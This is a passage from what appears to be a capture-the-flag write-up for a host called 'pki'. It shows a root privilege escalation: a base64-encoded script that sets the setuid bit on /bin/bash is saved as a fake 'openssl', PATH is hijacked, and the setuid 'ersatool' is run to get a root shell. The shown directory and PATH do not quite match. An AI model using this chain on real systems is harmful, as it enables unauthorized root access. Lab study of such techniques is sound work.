IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo=
```

And on the pki box

```bash
www-data@pki:/tmp/jpfdevs$ echo 'IyEvYmluL2Jhc2gKY2htb2QgdStzIC9iaW4vYmFzaAo=' | base64 -d > openssl
```

Now we has to execute the ersatool

```bash
www-data@pki:/tmp/jpfdevs$ chmod +x openssl
www-data@pki:/tmp/jpfdevs$ export PATH=/tmp:$PATH
www-data@pki:/tmp/jpfdevs$ echo $PATH
www-data@pki:/tmp/jpfdevs$ /usr/bin/ersatool
# create
create->CN=test
# exit
bash-4.4# 
```